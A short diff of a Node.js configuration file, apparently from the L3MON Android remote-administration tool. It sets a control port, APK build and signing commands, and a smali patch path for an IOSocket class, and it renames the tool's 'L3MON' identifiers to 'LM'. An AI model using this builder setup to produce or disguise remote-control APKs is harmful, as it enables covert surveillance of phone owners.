@@ -7,7 +7,7 @@ exports.control_port = 22222;
 
 // Paths
 exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk')
-exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk')
+exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/LM.apk')
 
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
@@ -15,7 +15,7 @@ exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
 exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
-exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');
+exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/LM/IOSocket.smali');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
 exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
